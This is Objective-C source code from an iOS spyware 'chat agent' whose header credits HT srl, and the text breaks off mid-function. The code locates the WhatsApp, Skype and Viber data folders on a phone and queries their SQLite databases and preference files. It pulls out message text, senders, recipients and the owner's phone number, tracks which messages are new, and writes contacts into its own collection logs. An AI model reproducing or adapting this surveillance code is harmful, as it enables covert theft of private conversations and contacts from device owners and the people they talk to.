/*
 * RCSiOS - chat agent
 *
 *
 * Created by Massimo Chiodini on 7/25/2012
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */


#import "RCSIAgentChat.h"
#import "RCSILogManager.h"
#import "RCSIUtils.h"
#import "RCSIAgentAddressBook.h"
#import "RCSILogManager.h"

// query for line chat...
//select zmessage.z_pk, zmessage.ztext, zmessage.zmessagetype, zuser.zname from zmessage inner join zchat on zchat.z_pk = zmessage.zchat inner join zuser on zuser.zmid = zchat.zmid where zmessage.z_pk > 0

#define USER_APPLICATIONS_PATH    @"/private/var/mobile/Applications"
#define k_i_AgentChatRunLoopMode  @"k_i_AgentChatRunLoopMode"
#define CHAT_TIMEOUT 5
#define LOG_DELIMITER 0xABADC0DE

#define SKYPE_TYPE 0x00000001
#define WHATS_TYPE 0x00000006
#define VIBER_TYPE 0x00000009

// Flags for AB contacts
#define WHATS_APP_FLAG 0x80000001
#define SKYPE_APP_FLAG 0x80000002
#define VIBER_APP_FLAG 0x80000004

// Whatsapp sql positions
#define ZMEMBERJID_POS    0
#define ZTEXT_POS         0
#define ZISFROMME_POS     1
#define ZGROUPMEMBER_POS  2
#define ZFROMJID_POS      3
#define ZTOJID_POS        4
#define Z_PK_POS          5
#define ZCHATSESSION_POS  6

// Skype sql positions
#define BODY_XML_POS      0
#define AUTHOR_POS        1
#define DIALOG_PART_POS   2
#define ID_POS            3
#define PARTICIPANTS_POS  4

// Viber sql positions
#define VIBER_PK_POS      0
#define VIBER_TEXT_POS    1
#define VIBER_STATE_POS   2
#define VIBER_PHONE_POS   3

static BOOL gWahtAppContactGrabbed = NO;
static BOOL gSkypeContactGrabbed = NO;

#pragma mark -
#pragma mark skXmlShared
#pragma mark -

/*
 * Support class for Skype xml DB
 */

//protocol definition for building on sdk 3.0
@protocol NSXMLParserDelegate;

@implementation skXmlShared

@synthesize mDefaultUser;

- (id)initWithPath:(NSString*)aPath
{
  self = [super init];
  
  if (self != nil)
  {
    mRootPathName = [aPath retain];
    mDefaultUser = nil;
    mLibElemReached = FALSE;
    mAccountElemReached = FALSE;
    mDefaultElemReached = FALSE;
  }
  
  return self;
}

- (void)dealloc
{
  [mRootPathName release];
  [mDefaultUser release];
  [super dealloc];
}

- (BOOL)parse
{
  NSString *_strPath = [NSString stringWithFormat:@"file://%@/Library/Application Support/Skype/shared.xml",
                       mRootPathName];
  
  NSString *strPath =  [_strPath stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
  
  NSURL *_url = [NSURL URLWithString:strPath];
  
  NSXMLParser *parser = [[NSXMLParser alloc] initWithContentsOfURL:_url];

  [parser setDelegate:(id < NSXMLParserDelegate >)self];
  
  BOOL bRet = [parser parse];
  
  [parser release];
  
  return bRet;
}

#pragma mark -
#pragma mark Delegate calls
#pragma mark -

- (void)parser:(NSXMLParser *)parser
didStartElement:(NSString *)elementName
  namespaceURI:(NSString *)namespaceURI
 qualifiedName:(NSString *)qName
    attributes:(NSDictionary *)attributeDict
{
  if ([elementName compare: @"Lib"]     == NSOrderedSame)
    mLibElemReached = TRUE;
  if ([elementName compare: @"Account"] == NSOrderedSame)
    mAccountElemReached = TRUE;
  if ([elementName compare: @"Default"] == NSOrderedSame)
    mDefaultElemReached = TRUE;
  
  if (mDefaultElemReached == TRUE &&
      mAccountElemReached == TRUE &&
      mLibElemReached == TRUE)
  {
    mDefaultUser = [[NSMutableString alloc] init];
  }
}

- (void)parser:(NSXMLParser *)parser
 didEndElement:(NSString *)elementName
  namespaceURI:(NSString *)namespaceURI
 qualifiedName:(NSString *)qName
{
  if ([elementName compare: @"Default"] == NSOrderedSame)
  {
    mDefaultElemReached = FALSE;
  }
}

- (void)parser:(NSXMLParser *)parser
foundCharacters:(NSString *)string
{
  if (mDefaultElemReached == TRUE &&
      mAccountElemReached == TRUE &&
      mLibElemReached == TRUE)
    [mDefaultUser appendString:string];
}

@end

#pragma mark -
#pragma mark _i_AgentChat
#pragma mark -

@implementation _i_AgentChat

#pragma mark -
#pragma mark - Initialization
#pragma mark -

- (id)init
{
    self = [super init];
    if (self)
    {
      mLastMsgPK = 0;
      mLastWAMsgPk = 0;
      mLastSkMsgPk = 0;
      mLastVbMsgPk = 0;
      
      mAgentID = AGENT_IM;
      
      mWADbPathName = nil;
      mWAUsername = @"";
      mSkDbPathName = nil;
      mSkUsername = @"";
      mVbDbPathName = nil;
      mVbUsername = @"";
    }
    
    return self;
}

#pragma mark -
#pragma mark - Common methods
#pragma mark -

- (void)getProperties
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [[_i_Utils sharedInstance] getPropertyWithName: chatClassKey];
  
  if (tmpDict != nil)
  {
    NSNumber *tmplaskpk =   [tmpDict objectForKey: @"lastpk"];
    NSNumber *tmpWALastPK = [tmpDict objectForKey: @"WAlastpk"];
    NSNumber *tmpSkLastPK = [tmpDict objectForKey: @"Sklastpk"];
    NSNumber *tmpVbLastPK = [tmpDict objectForKey: @"Vblastpk"];
    
    if (tmplaskpk != nil)
      mLastMsgPK = [tmplaskpk intValue];
    
    if (tmpWALastPK != nil)
      mLastWAMsgPk = [tmpWALastPK intValue];
    
    if (tmpSkLastPK != nil)
      mLastSkMsgPk = [tmpSkLastPK intValue];
    
    if (tmpVbLastPK != nil)
      mLastVbMsgPk = [tmpVbLastPK intValue];
  }
  
  [pool release];
}

- (void)setProperties
{
  NSNumber *tmpLastPK = [NSNumber numberWithInt: mLastMsgPK];
  NSNumber *tmpWALastPK = [NSNumber numberWithInt: mLastWAMsgPk];
  NSNumber *tmpSkLastPK = [NSNumber numberWithInt: mLastSkMsgPk];
  NSNumber *tmpVbLastPK = [NSNumber numberWithInt: mLastVbMsgPk];
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:tmpLastPK,   @"lastpk",
                                                                     tmpWALastPK, @"WAlastpk",
                                                                     tmpSkLastPK, @"Sklastpk",
                                                                     tmpVbLastPK, @"Vblastpk",nil];
  
  [[_i_Utils sharedInstance] setPropertyWithName: chatClassKey withDictionary: tmpDict];
}

- (void)logChatContacts:(NSString*)contact appName:(NSString*)appName flag:(NSInteger)flags
{
  if (flags == WHATS_APP_FLAG && gWahtAppContactGrabbed == TRUE)
    return;
  
  if (flags == SKYPE_APP_FLAG && gSkypeContactGrabbed == TRUE)
    return;
  
  if (mWAUsername == @"" || gWahtAppContactGrabbed == YES)
    return;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST_2;
  abFile.magic    = CONTACTFILE;
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = 1;
  header.len        = 0xFFFFFFFF;
  
  NSData *firstData = [appName dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  // New contact
  abFile.len   = 0;
  
  // 0x80000001 = WahtsApp
  // 0x80000002 = Skype
  // 0x80000004 = Viber
  abFile.flag = flags;
  
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
  
  // FirstName abNames
  abNames.len = [firstData length];
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [firstData bytes]
               length: abNames.len];
  
  // LastName abNames
  abNames.len = [firstData length];
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [firstData bytes]
               length: abNames.len];
  
  // Telephone numbers
  abContat.numContats = 1;
  [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
  
  abNumber.type = 0;
  [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
  
  abNames.len = [contact lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [[contact dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
               length: abNames.len];
  
  
  // Setting len of NSData - sizeof(magic)
  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
  
  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0xABCD];
  
  if (success == TRUE)
  {
    if ([logManager writeDataToLog:abData
                          forAgent:LOG_ADDRESSBOOK
                         withLogID:0xABCD] == TRUE)
    {
      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0xABCD];
    }
  }
  
  [abData release];
  
  [pool release];
  
  if (flags == WHATS_APP_FLAG)
    gWahtAppContactGrabbed = TRUE;
  
  if (flags == SKYPE_APP_FLAG)
    gSkypeContactGrabbed = TRUE;
}

#pragma mark -
#pragma mark Skype Support methods
#pragma mark -

- (NSString*)getSkRootPathName
{
  NSString *rootPath = nil;
  
  NSArray *usrAppFirstLevelPath =
  [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
                                                      error:nil];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  rootPath;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return  rootPath;
    }
    
    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/Skype.app",
                                                   USER_APPLICATIONS_PATH,
                                                   [usrAppFirstLevelPath objectAtIndex:i]];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
    {
      rootPath = [NSString stringWithFormat:@"%@/%@",
                                            USER_APPLICATIONS_PATH,
                                            [usrAppFirstLevelPath objectAtIndex:i]];
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
      {
        //[rootPath release];
        rootPath = nil;
      }
      else
      {
        [rootPath retain];
        [pool release];
        break;
      }
    }
    
    [pool release];
  }
  
  return rootPath;
}

- (void)setSkUserName
{
  if ([self isThreadCancelled] == TRUE)
    return;
  
  skXmlShared *skShared = [[skXmlShared alloc] initWithPath: [self getSkRootPathName]];
  
  [skShared parse];
  
  if ([skShared mDefaultUser] != nil)
    mSkUsername = [[skShared mDefaultUser] retain];
  
  [skShared release];
}

- (BOOL)setSkDbPathName
{
  BOOL bRet = FALSE;
  
  if ([self isThreadCancelled] == TRUE)
    return  FALSE;
  
  if (mSkDbPathName != nil)
    return TRUE;
  
  NSString *rootPath = [self getSkRootPathName];
  
  [self setSkUserName];
  
  if (rootPath != nil && mSkUsername != nil)
  {
    mSkDbPathName = [[NSString alloc] initWithFormat:@"%@/Library/Application Support/Skype/%@/main.db",
                                                     rootPath,
                                                     mSkUsername];
    
    [rootPath release];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mSkDbPathName] == TRUE)
      bRet = TRUE;
    else
    {
      [mSkDbPathName release];
      mSkDbPathName = nil;
    }
  }
  
  return bRet;
}

- (BOOL)isThereSkype
{
  return [self setSkDbPathName];
}

#pragma mark -
#pragma mark Skype SQLITE3 stuff
#pragma mark -

- (void)closeSkChatDB:(sqlite3*)db
{
  if (db != NULL)
    sqlite3_close(db);
}

- (sqlite3*)openSkChatDB
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE ||
      mSkUsername == nil ||
      mSkDbPathName == nil)
  {
    return db;
  }
  
  sqlite3_open([mSkDbPathName UTF8String], &db) ;
  
  return db;
}

- (NSString*)getSqlString:(sqlite3_stmt*)compiledStatement
                   colNum:(int)column
{
  NSString *sqlStr = nil;
  
  char *tmpString = (char*)sqlite3_column_text(compiledStatement, column);
  
  if (tmpString != NULL)
    sqlStr =[NSString stringWithUTF8String:tmpString];
  
  return sqlStr;
}

- (NSMutableString*)getSkMultiChatsMembers:(sqlite3_stmt*)compiledStatement
                                    colNum:(int)column
                                 excluding:(NSString*)author
{
  NSString *sqlStr = nil;
  NSMutableString *retParts = [NSMutableString stringWithCapacity:0];
  
  char *tmpString = (char*)sqlite3_column_text(compiledStatement, column);
  
  if (tmpString != NULL)
    {
    sqlStr =[NSString stringWithUTF8String:tmpString];
    
    NSArray *tmpPartsArray = [sqlStr componentsSeparatedByString:@" "];
    
    for (int i=0; i < [tmpPartsArray count]; i++)
      {
      NSString *tmpPart = [tmpPartsArray objectAtIndex:i];
      
      if ([tmpPart compare:author] != NSOrderedSame)
        {
        if ([retParts length] > 0)
          [retParts appendString:@", "];
        
        [retParts appendString: tmpPart];
        }
      }
    }
  
  return retParts;
}

- (NSMutableArray*)getSkChatMessagesFormDB:(sqlite3*)theDB
                                  withDate:(int)theDate
{
  NSNumber *flags = nil;
  char wa_msg_query[256];
  NSMutableArray *retArray = nil;
  sqlite3_stmt *compiledStatement;
  NSNumber *type = [NSNumber numberWithInt:SKYPE_TYPE];
  
  //  char _wa_msg_query[] =
  //  "select body_xml, author, dialog_partner, id from Messages where id >";
  
  char _wa_msg_query[] =
  "select Messages.body_xml, Messages.author, Messages.dialog_partner, Messages.id, Chats.participants from Messages inner join Chats on Chats.name = Messages.chatname where Messages.id >";
  
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
  
  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      int pk = sqlite3_column_int(compiledStatement, ID_POS);
      
      if (pk > mLastSkMsgPk)
      {
        mLastSkMsgPk = pk;
        
        NSString *text = [self getSqlString:compiledStatement colNum:BODY_XML_POS];
        
        if (text != nil)
        {
          NSString *sndr = [self getSqlString:compiledStatement colNum:AUTHOR_POS];
          
          NSString *peer = [self getSqlString:compiledStatement colNum:DIALOG_PART_POS];
          
          if (peer == nil)
            peer = [self getSkMultiChatsMembers:compiledStatement
                                         colNum:PARTICIPANTS_POS
                                      excluding:sndr];
          
          if ([sndr compare:mSkUsername] == NSOrderedSame)
            flags = [NSNumber numberWithInt:0x00000001];
          else
            flags = [NSNumber numberWithInt:0x00000000];
          
          NSDictionary *tmpDict =
          [NSDictionary dictionaryWithObjectsAndKeys:text,                              @"text",
                                                     peer != nil ? peer : mSkUsername,  @"peers",
                                                     sndr != nil ? sndr : @" ",         @"sender",
                                                     type,                              @"type",
                                                     flags,                             @"flags", nil];
          
          if (retArray == nil)
            retArray = [NSMutableArray arrayWithCapacity:0];
          
          [retArray addObject: tmpDict];
          
        }
      }
    }
    
    sqlite3_finalize(compiledStatement);
  }
  
  return retArray;
}

#pragma mark -
#pragma mark Viber Support methods
#pragma mark -

- (NSString*)getVbRootPathName
{
  NSString *rootPath = nil;
  
  NSArray *usrAppFirstLevelPath =
  [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
                                                      error:nil];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  rootPath;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return  rootPath;
    }
    
    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/Viber.app",
                                                   USER_APPLICATIONS_PATH,
                                                   [usrAppFirstLevelPath objectAtIndex:i]];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
    {
      rootPath = [NSString stringWithFormat:@"%@/%@",
                                            USER_APPLICATIONS_PATH,
                                            [usrAppFirstLevelPath objectAtIndex:i]];
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
      {
        //[rootPath release];
        rootPath = nil;
      }
      else
      {
        [rootPath retain];
        [pool release];
        break;
      }
    }
    
    [pool release];
  }
  
  return rootPath;
}

- (void)setVbUserName
{
  if ([self isThreadCancelled] == TRUE)
    return;
  
  NSString *tmpMyPhone = [[_i_Utils sharedInstance] getPhoneNumber];

  if (tmpMyPhone != nil)
    mVbUsername = [tmpMyPhone retain];
}

- (BOOL)setVbDbPathName
{
  BOOL bRet = FALSE;
  
  if ([self isThreadCancelled] == TRUE)
    return  FALSE;
  
  if (mVbDbPathName != nil)
    return TRUE;
  
  NSString *rootPath = [self getVbRootPathName];
  
  [self setVbUserName];
  
  if (rootPath != nil && mVbUsername != nil)
  {
    mVbDbPathName = [[NSString alloc] initWithFormat:@"%@/Documents/Contacts.data",
                                                     rootPath];
    
    [rootPath release];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mVbDbPathName] == TRUE)
      bRet = TRUE;
    else
    {
      [mVbDbPathName release];
      mVbDbPathName = nil;
    }
  }
  
  return bRet;
}

- (BOOL)isThereViber
{
  return [self setVbDbPathName];
}

#pragma mark -
#pragma mark Viber SQLITE3 stuff
#pragma mark -

- (void)closeVbChatDB:(sqlite3*)db
{
  if (db != NULL)
    sqlite3_close(db);
}

- (sqlite3*)openVbChatDB
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE ||
      mVbUsername == nil ||
      mVbDbPathName == nil)
    {
    return db;
    }
  
  sqlite3_open([mVbDbPathName UTF8String], &db) ;
  
  return db;
}

- (NSMutableArray*)getVbChatMessagesFormDB:(sqlite3*)theDB
                                  withDate:(int)theDate
{
  NSNumber *flags = nil;
  char wa_msg_query[512];
  NSMutableArray *retArray = nil;
  sqlite3_stmt *compiledStatement;
  NSNumber *type = [NSNumber numberWithInt:VIBER_TYPE]; // temporaneo: da mettere in db
  
  char _wa_msg_query[] =
  "select zvibermessage.z_pk, zvibermessage.ztext, zvibermessage.zstate, zphonenumberindex.zphonenum from zvibermessage inner join z_3phonenumindexes on z_3phonenumindexes.z_3conversations =  zvibermessage.zconversation inner join zphonenumberindex on zphonenumberindex.z_pk = z_3phonenumindexes.z_5phonenumindexes where zvibermessage.z_pk >";
  
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
  
  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      int pk = sqlite3_column_int(compiledStatement, VIBER_PK_POS);
      
      if (pk > mLastVbMsgPk)
      {
        mLastVbMsgPk = pk;
        NSString *peer;
        NSString *sndr;
        
        NSString *text = [self getSqlString:compiledStatement colNum:VIBER_TEXT_POS];
        
        if (text != nil)
        {
          NSString *state =[self getSqlString:compiledStatement colNum:VIBER_STATE_POS];
          
          if ([state compare: @"delivered"] == NSOrderedSame || [state compare: @"send"] == NSOrderedSame)
          {
            flags = [NSNumber numberWithInt:0x00000001];
            peer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
            sndr = mVbUsername;
          }
          else
          {
            flags = [NSNumber numberWithInt:0x00000000];
            peer = mVbUsername;
            sndr = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
          }
          
          NSDictionary *tmpDict =
          [NSDictionary dictionaryWithObjectsAndKeys:text,                      @"text",
                                                     peer != nil ? peer : @" ", @"peers",
                                                     sndr != nil ? sndr : @" ", @"sender",
                                                     type,                      @"type",
                                                     flags,                     @"flags",
                                                     nil];
          
          if (retArray == nil)
            retArray = [NSMutableArray arrayWithCapacity:0];
          
          [retArray addObject: tmpDict];
          
        }
      }
      else if (pk == mLastVbMsgPk) // if pk == last pk multi chat detected (inner join return multi line)
      {
          NSDictionary *tmpDict = [retArray lastObject];
          
          NSString *newTmpPeer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
          
          NSString *newPeer = [NSString stringWithFormat:@"%@, %@", [tmpDict objectForKey:@"peers"], newTmpPeer];
          
          NSDictionary *newTmpDict = [NSDictionary dictionaryWithObjectsAndKeys:[tmpDict objectForKey:@"text"] ,  @"text",
                                      newPeer,                          @"peers",
                                      [tmpDict objectForKey:@"sender"], @"sender",
                                      [tmpDict objectForKey:@"type"],   @"type",
                                      [tmpDict objectForKey:@"flags"],  @"flags",
                                      nil];
          
          [retArray removeObject:tmpDict];
          [retArray addObject:newTmpDict];
      }
    }
    
    sqlite3_finalize(compiledStatement);
  }
  
  return retArray;
}

#pragma mark -
#pragma mark WhatsApp Support methods
#pragma mark -

- (NSString*)getWARootPathName
{
  NSString *rootPath = nil;
  
  NSArray *usrAppFirstLevelPath =
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
                                                        error:nil];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  rootPath;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return  rootPath;
    }
    
    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/WhatsApp.app",
                                                   USER_APPLICATIONS_PATH,
                                                   [usrAppFirstLevelPath objectAtIndex:i]];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
    {
      rootPath = [NSString stringWithFormat:@"%@/%@",
                                            USER_APPLICATIONS_PATH,
                                            [usrAppFirstLevelPath objectAtIndex:i]];
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
      {
        //[rootPath release];
        rootPath = nil;
      }
      else
      {
        [rootPath retain];
        [pool release];
        break;
      }
    }
    
    [pool release];
  }
  
  return rootPath;
}

- (NSString*)getWAPhoneNumber:(NSString*)aContatNum
{
  NSRange rng = [aContatNum rangeOfString: @"@"];
  
  if (rng.location != NSNotFound)
    return [aContatNum substringToIndex: rng.location];
  else
    return aContatNum;
}

- (void)setWAUserName
{
  if ([self isThreadCancelled] == TRUE || [mWAUsername length] > 0)
    return;
  
  NSString *rootPath = [self getWARootPathName];
  
  if (rootPath != nil)
  {
    NSString *WAPrefsPath =
      [NSString stringWithFormat:@"%@/Library/Preferences/net.whatsapp.WhatsApp.plist",
                                 rootPath];
    [rootPath release];
    
    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile: WAPrefsPath];
    
    if (prefs != nil && [prefs objectForKey: @"OwnJabberID"] != nil)
    {
      NSString *tmpWAUsername = [prefs objectForKey: @"OwnJabberID"];
      
      mWAUsername = [[NSString alloc] initWithString: [self getWAPhoneNumber: tmpWAUsername]];
    }
  }
}

- (BOOL)setWADbPathName
{
  BOOL bRet = FALSE;
     
  if ([self isThreadCancelled] == TRUE) 
    return  FALSE;
    
  if (mWADbPathName != nil)
    return TRUE;
  
  [self setWAUserName];
  
  NSString *rootPath = [self getWARootPathName];
    
  if (rootPath != nil)
  {
    mWADbPathName = [[NSString alloc] initWithFormat:@"%@/Documents/ChatStorage.sqlite",
                                                    rootPath];
    
    [rootPath release];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mWADbPathName] == TRUE)
      bRet = TRUE;
    else
    {
      [mWADbPathName release];
      mWADbPathName = nil;
    }
  }

  return bRet;
}

- (BOOL)isThereWahtsApp
{
  return [self setWADbPathName];
}

#pragma mark -
#pragma mark WhatsApp SQLITE3 stuff
#pragma mark -

- (void)closeWAChatDB:(sqlite3*)db
{
  if (db != NULL)
    sqlite3_close(db);
}

- (sqlite3*)openWAChatDB
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE || mWADbPathName == nil)
  {
    return db;
  }
  
  sqlite3_open([mWADbPathName UTF8String], &db) ;
  
  return db;
}

- (NSString*)getSqlLiteString:(sqlite3_stmt*)compiledStatement
                       colNum:(int)column
{
  NSString *sqlStr = nil;
  
  if (sqlite3_column_text(compiledStatement, column) != NULL)
  {
    sqlStr =[NSString stringWithUTF8String:(char *)sqlite3_column_text(compiledStatement, column)];
  }
  else
  {
    sqlStr = [NSString stringWithUTF8String:" "];
  }
  
  return  sqlStr;
}

- (NSString*)getFromJIDFromGroup:(sqlite3_stmt*)aCompiledStat
                          fromDB:(sqlite3*)theDb
{
  NSString *from = nil;
  sqlite3_stmt *compiledStatement;
  char wa_msg_query[256];
  
  int zgrpmem = sqlite3_column_int(aCompiledStat, ZGROUPMEMBER_POS);
  
  char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where Z_PK = ";
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, zgrpmem);

  
  if(sqlite3_prepare_v2(theDb, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    if (sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
      
      if (tmpPeer == NULL)
        from = [NSString stringWithUTF8String: " "];
      else
        from = [NSString stringWithUTF8String:(char *)tmpPeer];
    }
  }
  
  sqlite3_finalize(compiledStatement);
  
  return from;
}

- (NSString*)getFromJID:(sqlite3_stmt*)aCompiledStat
                 fromDB:(sqlite3*)theDb
{
  NSString *from = nil;
  
  // case 1: sender is me ZISFROMME = 1
  if (sqlite3_column_int(aCompiledStat, ZISFROMME_POS) == TRUE)
  {
    from = mWAUsername;
  }
  else
  {
    int zgrpmem = sqlite3_column_int(aCompiledStat, ZGROUPMEMBER_POS);
    
    // case 3: from member of group: ZFROMJID != nil && ZGROUPMEMBER != nil)
    if (zgrpmem != 0)
    {
      from = [self getFromJIDFromGroup: aCompiledStat fromDB: theDb];
    }
    else
    {
      // case 2: from a single user: (ZFROMJID != nil && ZGROUPMEMBER == nil)
      // case 4: from member of group: (ZFROMJID != nil && ZGROUPMEMBER == nil)
      const unsigned char *_from = sqlite3_column_text(aCompiledStat, ZFROMJID_POS);
      if (_from != NULL)
      {
        for (int i=0; i < strlen((char*)_from); i++)
        {
          if (_from[i] == '-')
          {
            char *ptr = (char*)_from + i;
            *ptr = 0;
            break;
          }
        }
        
        from = [NSString stringWithUTF8String:(char *)_from];
      }
      else
        from = [NSString stringWithUTF8String:" "];
    }
  }
  
  return [self getWAPhoneNumber: from];
}

- (BOOL)isAGroup:(NSString*)aName
{
  NSRange range = [aName rangeOfString:@"-"];
  
  if (range.location == NSNotFound)
    return FALSE;
  else
    return TRUE;
}

- (NSString*)getToJIDFromGroup:(sqlite3_stmt*)aCompiledStat
                        fromDB:(sqlite3*)theDb
                     excluding:(NSString*)aUserId
{
  NSString *to = nil;
  NSMutableString *_to = nil;
  NSString *tmpPeer;
  
  sqlite3_stmt *compiledStatement;
  char wa_msg_query[256];
  
  int zchtsess = sqlite3_column_int(aCompiledStat, ZCHATSESSION_POS);
  
  char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION = ";
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, zchtsess);
  
  if(sqlite3_prepare_v2(theDb, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    if (sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      _to = [NSMutableString stringWithCapacity:0];
      
      const unsigned char *_tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
      
      if (_tmpPeer != NULL)
        tmpPeer = [NSString stringWithUTF8String:(char *)_tmpPeer];
      else
        tmpPeer = [NSString stringWithUTF8String: " "];
      
      NSString *__tmpPeer = [self getWAPhoneNumber:tmpPeer];
      if ([__tmpPeer compare: aUserId] != NSOrderedSame)
        [_to appendString: __tmpPeer];
      
      while (sqlite3_step(compiledStatement) == SQLITE_ROW)
      {
        _tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
        if (_tmpPeer != NULL)
          tmpPeer = [NSString stringWithUTF8String:(char *)_tmpPeer];
        else
          tmpPeer = [NSString stringWithUTF8String: " "];
        
        NSString *__tmpPeer = [self getWAPhoneNumber:tmpPeer];
        if ([__tmpPeer compare: aUserId] != NSOrderedSame)
        {
          [_to appendString:@","];
          [_to appendString:__tmpPeer];
        }
      }
    }
  }
  
  sqlite3_finalize(compiledStatement);
  
  if (_to != nil)
    to = [NSString stringWithString: _to];
  
  return to;
}

- (NSString*)getToJID:(sqlite3_stmt*)aCompiledStat
               fromDB:(sqlite3*)theDb
            excluding:(NSString*)theSender
{
  NSString *to = nil;
  NSString *_to = nil;
  
  const unsigned char *__to = sqlite3_column_text(aCompiledStat, ZTOJID_POS);
  
  if (__to != NULL)
    _to = [NSString stringWithUTF8String:(char *)__to];
  else
    _to = mWAUsername;
  
  // i'm the sender: rcpt should be a group or single user
  if (sqlite3_column_int(aCompiledStat, ZISFROMME_POS) == TRUE)
  {
    if ([self isAGroup:_to] == TRUE)
      to = [self getToJIDFromGroup:aCompiledStat fromDB:theDb excluding: theSender];
    else
      to = [self getWAPhoneNumber: _to];
  }
  else
  {
    // i'm the rcpt: if sender is a group the rcpt must be a group
    NSString *_fr;
    
    const unsigned char *__fr = sqlite3_column_text(aCompiledStat, ZFROMJID_POS);
    
    if (__fr != NULL)
      _fr = [NSString stringWithUTF8String:(char *)__fr];
    else
      _fr = [NSString stringWithUTF8String: " "];
    
    if ([self isAGroup:_fr] == TRUE)
      to = [self getToJIDFromGroup:aCompiledStat fromDB:theDb excluding: theSender];
    else
      to = [self getWAPhoneNumber: _to];
  }
  
  return to;
}

- (NSString*)getText:(sqlite3_stmt*)aCompiledStat
              fromDB:(sqlite3*)theDb
{
  NSString *text = nil;
  
  const unsigned char *_text = sqlite3_column_text(aCompiledStat, ZTEXT_POS);
  
  if (_text != NULL)
  {
